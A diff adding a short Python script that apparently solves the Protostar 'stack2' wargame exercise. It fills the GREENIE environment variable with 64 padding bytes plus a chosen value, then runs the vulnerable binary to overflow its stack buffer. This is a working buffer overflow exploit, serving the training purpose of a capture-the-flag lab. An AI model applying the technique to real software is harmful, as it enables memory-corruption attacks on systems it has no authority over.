@@ -1,0 +1,8 @@
+#!/usr/bin/env python
+import os
+
+BUFFER = "a" * 64
+GREENIE = BUFFER.encode() + b"\x0a\x0d\x0a\x0d"
+os.environ["GREENIE"] = GREENIE.decode()
+
+os.system('/opt/protostar/bin/stack2')
